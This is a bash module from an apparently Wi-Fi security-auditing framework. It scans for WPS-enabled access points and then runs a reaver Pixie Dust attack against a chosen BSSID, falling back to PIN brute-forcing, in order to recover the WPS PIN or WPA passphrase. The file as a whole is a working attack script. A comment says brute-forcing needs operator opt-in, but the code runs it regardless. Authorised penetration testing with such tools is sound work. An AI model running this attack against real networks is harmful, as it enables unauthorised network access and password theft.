#!/usr/bin/env bash
# MODULE_META
# NAME="WPS Vulnerability Testing"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="wash,reaver,bully"
# DESC="Detect WPS-enabled APs and test for PIN/PBC vulnerabilities"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="no"
# TIMED="yes"
# PROMPTS="wps_vector"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d3_wps_testing.sh
#  D3: WPS Vulnerability Testing (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D3"
WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
INFO_FILE="${EVIDENCE_DIR}/${TC_ID}_reaver_info.txt"
WPS_ATTACK="${WPS_ATTACK:-1}"
WPS_DELAY="${WPS_DELAY:-}"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

echo "[*] Starting WPS vulnerability audit..."

# 1. Start Telemetry in Background (bounded)
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        PCT=$(( 10 + (ELAPSED * 80 / SCAN_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing WPS audit..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tools
# WPS attack sequence:
#   Phase 1: Pixie Dust (reaver -K 1) — exploits weak DH nonces in AP firmware.
#            Fast (seconds to minutes). Most modern APs are patched, but many embedded
#            devices still vulnerable. Check for "WPS PIN" in output = success.
#   Phase 2: PIN brute-force fallback — only if Pixie Dust did not recover credentials.
#            Slow (hours). Use only with explicit operator opt-in via WPS_ATTACK=2.
PIXIE_FILE="${EVIDENCE_DIR}/${TC_ID}_pixie.txt"
PIN_FILE="${EVIDENCE_DIR}/${TC_ID}_pin_bruteforce.txt"

run_wps_attack() {
    local target_iface="$1" target_bssid="$2" target_chan="$3" out_file="$4"
    local args="-i ${target_iface} -b ${target_bssid}"
    [[ -n "$target_chan" ]] && args+=" -c ${target_chan}"
    [[ -n "$WPS_DELAY" ]] && args+=" -d ${WPS_DELAY}"
    # shellcheck disable=SC2086
    timeout "$SCAN_TIME" reaver ${args} "$@" -vv >> "$out_file" 2>&1 || true
}

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
    if [[ -n "$BSSID" ]]; then
        echo "[*] Phase 1: Pixie Dust attack (reaver -K 1)..."
        {
            ARGS="-i $INTERFACE -b $BSSID"
            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
            # shellcheck disable=SC2086
            timeout "$SCAN_TIME" reaver $ARGS -K 1 -vv 2>&1 | tee "$PIXIE_FILE" || true
        }

        # Phase 2: PIN brute-force fallback if Pixie Dust did not recover credentials
        if ! grep -qiE "WPA PSK|WPS PIN" "$PIXIE_FILE" 2>/dev/null; then
            echo "[*] Phase 2: Pixie Dust failed — falling back to PIN brute-force (slow)..."
            ARGS="-i $INTERFACE -b $BSSID"
            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
            # shellcheck disable=SC2086
            timeout "$SCAN_TIME" reaver $ARGS -vv 2>&1 | tee "$PIN_FILE" || true
        fi
        cat "$PIXIE_FILE" "$PIN_FILE" 2>/dev/null > "$INFO_FILE" || true
    fi
else
    (
        timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
        if [[ -n "$BSSID" ]]; then
            echo "[*] Phase 1: Pixie Dust attack..." >> "$INFO_FILE"
            ARGS="-i $INTERFACE -b $BSSID"
            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
            # shellcheck disable=SC2086
            timeout "$SCAN_TIME" reaver $ARGS -K 1 -vv > "$PIXIE_FILE" 2>&1 || true

            # Phase 2 fallback: PIN brute-force only if Pixie Dust yielded nothing
            if ! grep -qiE "WPA PSK|WPS PIN" "$PIXIE_FILE" 2>/dev/null; then
                echo "[*] Phase 2: PIN brute-force fallback..." >> "$INFO_FILE"
                # shellcheck disable=SC2086
                timeout "$SCAN_TIME" reaver $ARGS -vv > "$PIN_FILE" 2>&1 || true
            fi
            cat "$PIXIE_FILE" "$PIN_FILE" 2>/dev/null > "$INFO_FILE" || true
        fi
    ) > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID || true
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Reporting
if [[ -n "$BSSID" ]]; then
    SUCCESS=0
    if grep -qiE "WPA PSK|WPS PIN" "$INFO_FILE" 2>/dev/null; then
        SUCCESS=1
    fi
    if [[ $SUCCESS -eq 1 ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "WPS Attack Successful" \
            --severity CRITICAL \
            --desc "Successfully recovered credentials for BSSID ${BSSID} via reaver." \
            --evidence "$INFO_FILE" \
            --rationale "Successful WPS exploitation bypasses the need for complex handshake cracking."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[$TC_ID] Audit Complete" \
            --severity INFO \
            --desc "Attempted WPS exploitation on ${BSSID}. No results obtained." \
            --evidence "$INFO_FILE" \
            --rationale "Attack failure suggests AP hardening or rate-limiting."
    fi
else
    WPS_COUNT=$(awk 'NR>2 {count++} END {print count+0}' "$WASH_FILE" 2>/dev/null || echo 0)
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPS Audit Complete" \
        --severity INFO \
        --desc "Identified ${WPS_COUNT} networks with WPS enabled." \
        --evidence "$WASH_FILE" \
        --rationale "WPS status identifies high-risk targets."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
